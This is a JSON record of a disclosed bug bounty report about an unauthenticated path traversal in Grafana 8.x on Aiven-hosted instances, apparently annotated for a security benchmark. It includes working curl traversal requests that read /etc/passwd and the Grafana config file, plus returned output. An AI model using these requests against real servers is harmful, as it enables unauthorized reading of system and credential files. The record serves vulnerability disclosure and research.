@@ -1,0 +1,38 @@
+{
+    "reported_to": "Aiven Ltd",
+    "reported_by": "j0v ",
+    "title": "Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read",
+    "content": "\nSummary:\nHi team,\nI've found a path traversal issue in the Grafana instances hosted on the Aiven platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.\nSteps To Reproduce:\nLogin at https://console.aiven.io\nCreate a new Grafana instance and wait till it's up and running 1.Run the following curl command to get the content of the /etc/passwd file on the server:\nCode 138 Bytes\n1curl https://grafana-303ca6f8-\u2588\u2588\u2588\u2588.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\nOutput:\nCode 1.13 KiB\n1$ curl https://grafana-303ca6f8-\u2588\u2588\u2588\u2588\u2588\u2588\u2588.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n2root:x:0:0:root:/root:/bin/bash\n3bin:x:1:1:bin:/bin:/sbin/nologin\n4daemon:x:2:2:daemon:/sbin:/sbin/nologin\n5adm:x:3:4:adm:/var/adm:/sbin/nologin\n6lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n7sync:x:5:0:sync:/sbin:/bin/sync\n8shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n9halt:x:7:0:halt:/sbin:/sbin/halt\n10mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n11operator:x:11:0:operator:/root:/sbin/nologin\n12games:x:12:100:games:/usr/games:/sbin/nologin\n13ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\n14nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\n15\u2588\u2588\u2588\n16\u2588\u2588\u2588\u2588\u2588\n17\u2588\u2588\u2588\u2588\u2588\u2588\n18\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588\n22systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\n23systemd-coredump:x:992:991:systemd Core Dumper:/:/sbin/nologin\n24systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\n25systemd-timesync:x:991:990:systemd Time Synchronization:/:/sbin/nologin\n26\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n27dbus:x:81:81:System message bus:/:/sbin/nologin\n28\u2588\u2588\u2588\u2588\u2588\n29\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n30\u2588\u2588\u2588\u2588\u2588\u2588\n31\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n32\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n33\u2588\u2588\u2588\n34\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n35\u2588\u2588\u2588\n36\u2588\u2588\u2588\u2588\u2588\n37\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n38\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n39\u2588\u2588\u2588\n40\u2588\u2588\u2588\n41\u2588\u2588\u2588\u2588\n42\u2588\u2588\u2588\nSome other examples:\nSee the Grafana config:\nCode 160 Bytes\n1curl --path-as-is https://grafana-303ca6f8-\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini\nI'll keep my Grafana instance running so you can try to reproduce it with the examples above.\nImpact\nAn unauthenticated user can get access to all system files if he knows the exact path of the file.\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": 1000,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1639497540,
+    "report_url": "https://hackerone.com/reports/1415820",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a new Grafana instance on Aiven platform and wait for it to be running."
+        ],
+        [
+            2,
+            "Use curl to exploit the path traversal vulnerability by accessing /etc/passwd or other sensitive files via the URL: curl https://grafana-<instance-id>.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+        ]
+    ],
+    "vuln_description": "A path traversal vulnerability in Grafana 8.x allows unauthenticated users to read arbitrary local files on the server by manipulating the URL path to traverse directories.",
+    "reason": "The vulnerability involves a straightforward path traversal attack that does not require multiple components, complex state manipulation, or novel logic. The attack is simple and relies on a common vulnerability pattern.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
